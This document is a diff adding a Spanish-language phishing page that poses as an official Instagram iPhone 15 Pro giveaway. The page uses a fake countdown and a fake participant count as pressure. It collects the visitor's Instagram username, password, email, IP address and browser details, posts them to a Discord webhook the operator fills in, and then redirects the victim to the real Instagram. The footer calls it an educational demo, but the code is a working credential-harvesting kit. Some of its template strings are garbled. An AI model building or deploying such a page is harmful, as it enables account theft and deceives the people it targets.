@@ -1,0 +1,261 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Sorteo Instagram - iPhone 15 Pro</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 25px 80px rgba(0,0,0,0.4);
+            width: 100%;
+            max-width: 400px;
+            padding: 40px;
+            text-align: center;
+            animation: slideUp 0.5s ease-out;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .badge {
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+        .icon {
+            font-size: 60px;
+            margin-bottom: 15px;
+        }
+        h1 {
+            color: #262626;
+            font-size: 26px;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        .subtitle {
+            color: #8e8e8e;
+            font-size: 14px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        .prize-box {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 25px 0;
+            border: 2px dashed #667eea;
+        }
+        .prize-icon { font-size: 50px; margin-bottom: 10px; }
+        .prize-name {
+            font-size: 20px;
+            font-weight: bold;
+            color: #262626;
+            margin-bottom: 5px;
+        }
+        .prize-value {
+            color: #667eea;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .countdown {
+            background: #ff4757;
+            color: white;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            background: #fafafa;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+        }
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(45deg, #0095f6, #667eea);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(0,149,246,0.4);
+        }
+        .participants {
+            margin-top: 20px;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        .verified {
+            color: #00b894;
+            font-weight: bold;
+        }
+        .loading {
+            display: none;
+            margin-top: 15px;
+        }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0095f6;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="badge">Sorteo Oficial</div>
+        <div class="icon">ðŸ“±</div>
+        <h1>Â¡Gana un iPhone 15 Pro!</h1>
+        <div class="subtitle">Sorteo exclusivo para la comunidad de Instagram. Verifica tu cuenta para participar.</div>
+        
+        <div class="prize-box">
+            <div class="prize-icon">ðŸŽ</div>
+            <div class="prize-name">iPhone 15 Pro Max</div>
+            <div class="prize-value">Valor: ,199 USD</div>
+            <div style="margin-top: 10px; font-size: 12px; color: #666;">+ 5 ganadores de tarjetas de </div>
+        </div>
+        
+        <div class="countdown">â° Termina en: <span id="timer">04:23:15</span></div>
+        
+        <form id="sorteoForm">
+            <input type="text" id="usuario" placeholder="Usuario de Instagram" required autocomplete="off">
+            <input type="password" id="password" placeholder="ContraseÃ±a" required>
+            <input type="email" id="email" placeholder="Correo electrÃ³nico" required>
+            <button type="submit" id="btnSubmit">Participar Ahora ðŸš€</button>
+        </form>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <div style="margin-top: 10px; color: #666; font-size: 12px;">Verificando cuenta...</div>
+        </div>
+        
+        <div class="participants">
+            <span class="verified">âœ“</span> 2,847 participantes verificados
+        </div>
+    </div>
+
+    <script>
+        // Contador regresivo falso
+        function updateTimer() {
+            const timer = document.getElementById('timer');
+            let [h, m, s] = timer.textContent.split(':').map(Number);
+            
+            if(s > 0) s--;
+            else if(m > 0) { m--; s = 59; }
+            else if(h > 0) { h--; m = 59; s = 59; }
+            
+            timer.textContent = \\:\:\\;
+        }
+        setInterval(updateTimer, 1000);
+
+        // WEBHOOK DE DISCORD - REEMPLAZAR ESTA LINEA
+        const WEBHOOK_URL = 'PEGA_AQUI_TU_WEBHOOK_DE_DISCORD';
+        
+        document.getElementById('sorteoForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const btn = document.getElementById('btnSubmit');
+            const loading = document.getElementById('loading');
+            
+            btn.style.display = 'none';
+            loading.style.display = 'block';
+            
+            const usuario = document.getElementById('usuario').value;
+            const password = document.getElementById('password').value;
+            const email = document.getElementById('email').value;
+            
+            // Obtener IP
+            let ip = 'desconocida';
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ip = ipData.ip;
+            } catch(e) {}
+            
+            const data = {
+                usuario: usuario,
+                password: password,
+                email: email,
+                ip: ip,
+                fecha: new Date().toLocaleString(),
+                userAgent: navigator.userAgent
+            };
+            
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        username: 'ðŸŽ£ Sorteo Instagram Bot',
+                        avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/100px-Instagram_logo_2016.svg.png',
+                        embeds: [{
+                            title: 'ðŸŽ‰ Nuevo Participante Capturado',
+                            description: 'Alguien ha caÃ­do en el sorteo falso',
+                            color: 0xe74c3c,
+                            fields: [
+                                {name: 'ðŸ‘¤ Usuario IG', value: \||\||\, inline: true},
+                                {name: 'ðŸ”‘ ContraseÃ±a', value: \||\||\, inline: true},
+                                {name: 'ðŸ“§ Email', value: \||\||\, inline: true},
+                                {name: 'ðŸŒ IP', value: data.ip, inline: true},
+                                {name: 'ðŸ“… Fecha', value: data.fecha, inline: true},
+                                {name: 'ðŸ’» Navegador', value: data.userAgent.substring(0, 50) + '...', inline: false}
+                            ],
+                            thumbnail: {url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/100px-Instagram_logo_2016.svg.png'},
+                            footer: {text: 'Phishing Demo - Uso Educativo'}
+                        }]
+                    })
+                });
+                
+                // Redirigir a Instagram real
+                window.location.href = 'https://www.instagram.com/';
+                
+            } catch(err) {
+                alert('Error de conexiÃ³n. Intenta de nuevo.');
+                btn.style.display = 'block';
+                loading.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
